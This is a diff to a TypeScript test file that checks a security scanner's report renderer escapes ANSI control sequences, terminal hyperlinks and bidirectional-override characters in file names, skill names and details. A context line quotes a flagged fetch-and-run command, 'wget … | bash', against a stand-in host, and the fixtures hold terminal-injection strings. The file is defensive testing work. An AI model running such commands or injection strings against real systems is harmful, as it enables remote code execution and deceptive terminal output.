@@ -1,6 +1,9 @@
 import { expect, test } from "bun:test";
 import type { Finding } from "../core/scan/index.ts";
-import { renderFindings } from "./report.ts";
+import { MODE_FILE } from "../core/skill/files.ts";
+import { fileLabel, renderFindings } from "./report.ts";
+
+const ESC = "\u001B";
 
 test("renderFindings renders the supplied help literally", () => {
   const findings: Finding[] = [
@@ -95,4 +98,77 @@ test("renderFindings keeps an accepted critical finding under critical and marks
       "    setup.sh:5  wget -qO- https://x.invalid | bash",
     ].join("\n"),
   );
+});
+
+const executableAt = (file: string, detail: string): Finding => ({
+  severity: "warn",
+  confidence: "high",
+  rule: "executable",
+  help: "ships an executable",
+  file,
+  detail,
+});
+
+test("renderFindings escapes control characters in file paths and aligns the escaped text", () => {
+  const rendered = renderFindings("fixture", [
+    executableAt(`run${ESC}[2J.sh`, "first"),
+    executableAt("a\u202Eb", "second"),
+  ]);
+
+  expect(rendered).not.toContain(ESC + "[2J");
+  expect(Bun.stripANSI(rendered).split("\n").slice(-2)).toEqual([
+    "    run^[[2J.sh  first",
+    "    a<U+202E>b   second",
+  ]);
+});
+
+test("renderFindings hides only a repeated location, not one that escapes to the same text", () => {
+  const rendered = renderFindings("fixture", [
+    executableAt(`a${ESC}b`, "first"),
+    executableAt("a^[b", "second"),
+    executableAt("a^[b", "third"),
+  ]);
+
+  expect(Bun.stripANSI(rendered).split("\n").slice(-3)).toEqual([
+    "    a^[b  first",
+    "    a^[b  second",
+    "          third",
+  ]);
+});
+
+test("renderFindings escapes control characters in the skill name and the detail", () => {
+  const rendered = renderFindings(`evil${ESC}[2J`, [
+    {
+      severity: "warn",
+      confidence: "high",
+      rule: "symlink",
+      help: "links inside the skill",
+      file: "link",
+      detail: `symlink \u2192 a${ESC}]8;;x\u0007\u202Eb`,
+    },
+  ]);
+
+  expect(rendered).not.toContain(ESC + "[2J");
+  expect(rendered).not.toContain(ESC + "]8");
+  expect(Bun.stripANSI(rendered).split("\n")).toEqual([
+    "evil^[[2J: security scan",
+    "",
+    "1 warn finding",
+    "  symlink: links inside the skill",
+    "    link  symlink \u2192 a^[]8;;x^G<U+202E>b",
+  ]);
+});
+
+test("a tab or newline in a file name keeps the label on one row", () => {
+  expect(fileLabel({ path: "a\nb.sh", content: Buffer.from("x"), mode: MODE_FILE })).toBe(
+    "a^Jb.sh (1 B)",
+  );
+  const rendered = renderFindings("fixture", [
+    executableAt("a\nb.sh", "first"),
+    executableAt("c\td.sh", "second"),
+  ]);
+  expect(Bun.stripANSI(rendered).split("\n").slice(-2)).toEqual([
+    "    a^Jb.sh  first",
+    "    c^Id.sh  second",
+  ]);
 });
